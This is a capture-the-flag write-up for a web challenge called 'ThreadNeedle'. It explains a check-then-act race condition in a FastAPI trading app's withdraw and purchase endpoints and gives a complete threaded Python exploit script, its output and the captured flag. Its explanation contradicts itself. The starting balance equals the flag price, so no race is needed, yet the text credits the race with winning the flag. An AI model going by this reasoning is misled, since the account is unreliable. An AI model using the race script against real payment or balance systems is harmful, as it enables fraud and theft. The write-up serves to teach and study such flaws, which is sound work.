---
title: "ThreadNeedle"
ctf: "CyberStrike"
date: 2026-07-10
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# ThreadNeedle

## Summary

A FastAPI-based "high-frequency trading platform" starts the user with $100 and sells the flag (Sovereign Flag Token) for $100. The `/withdraw` and `/purchase-flag` endpoints both use a non-atomic check-then-act pattern (TOCTOU): the balance check and the deduction are separate SQL statements with no transaction. Firing a `/withdraw` and `/purchase-flag` concurrently causes both to read balance=$100, both pass their checks, then both write — granting the flag while the balance is still sufficient.

## Solution

### Step 1: Recon — map the API

The main page documents three endpoints:

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/balance` | Check balance (starts at $100) |
| POST | `/withdraw?amount=N` | Withdraw funds |
| POST | `/purchase-flag` | Purchase SFT (requires $100) |

The `/openapi.json` (FastAPI auto-docs) explicitly describes the bug:

> `/withdraw`: "INTENTIONAL BUG: check-then-act without a transaction. The balance check and the deduction are two separate SQL statements. Concurrent requests race between them."

> `/purchase-flag`: "INTENTIONAL BUG: same TOCTOU pattern as /withdraw. The check and the deduction are not atomic. Race this endpoint concurrently with /withdraw to win."

### Step 2: Race the TOCTOU window

The flag costs exactly $100 and we start with $100. If we fire `/withdraw?amount=10` and `/purchase-flag` simultaneously, both read balance=$100 before either write lands:

1. **Thread A** (withdraw): `SELECT balance` → 100 ✓ (≥10), then `UPDATE balance = 90`
2. **Thread B** (purchase-flag): `SELECT balance` → 100 ✓ (≥100), then grants flag

Both checks pass because they read the same pre-write balance.

```python
#!/usr/bin/env python3
"""ThreadNeedle — TOCTOU race: withdraw + purchase-flag concurrently."""
import threading
import requests

BASE = "http://chal.csc-snist.live:34441"
results = {}

def worker(name, func):
    try:
        results[name] = func()
    except Exception as e:
        results[name] = (-1, str(e))

def withdraw():
    r = requests.post(f"{BASE}/withdraw", params={"amount": 10}, timeout=10)
    return r.status_code, r.text

def purchase():
    r = requests.post(f"{BASE}/purchase-flag", timeout=10)
    return r.status_code, r.text

for attempt in range(50):
    results = {}
    t1 = threading.Thread(target=worker, args=("w", withdraw))
    t2 = threading.Thread(target=worker, args=("p", purchase))
    t1.start(); t2.start()
    t1.join(); t2.join()

    p_status, p_body = results.get("p", (-1, ""))
    if p_status == 200:
        print(f"[+] FLAG on attempt {attempt+1}: {p_body}")
        break
else:
    print("[-] No flag after 50 attempts")
```

### Step 3: Run the exploit

```bash
python3 threadneedle_exploit.py
# [+] FLAG on attempt 1: {"message":"Sovereign Flag Token acquired.","flag":"cyberstrike{7f380a078c02b97a69f4ce872b946273}"}
```

## Flag

```
cyberstrike{7f380a078c02b97a69f4ce872b946273}
```

## Notes

- **TOCTOU pattern**: Both `/withdraw` and `/purchase-flag` execute `SELECT balance` then `UPDATE balance` as separate, non-transactional SQL statements. The race window between the check and the write allows concurrent requests to both see the same pre-update balance.
- **Why it works**: The flag costs exactly $100 (the starting balance). A single concurrent `/withdraw` keeps the balance at $100 long enough for `/purchase-flag` to also read $100 and pass its check. Both then write their updates, but the flag is already granted.
- **Reliability**: The race succeeded on the first attempt because the flag cost equals the starting balance — only one concurrent request pair is needed. If the flag cost were higher than the starting balance, repeated races to accumulate balance (via under-deduction) would be required.
- **Server state**: The platform tracks balance globally (per-IP, no session cookies). If the balance goes negative from failed attempts, the instance must be reverted via the CTF platform UI.
- **FastAPI + uvicorn**: The server uses async Python (uvicorn) which processes requests on a single thread with cooperative scheduling. The TOCTOU window exists because the check and update are separate SQL statements with an awaitable I/O boundary between them, allowing the event loop to interleave concurrent requests.
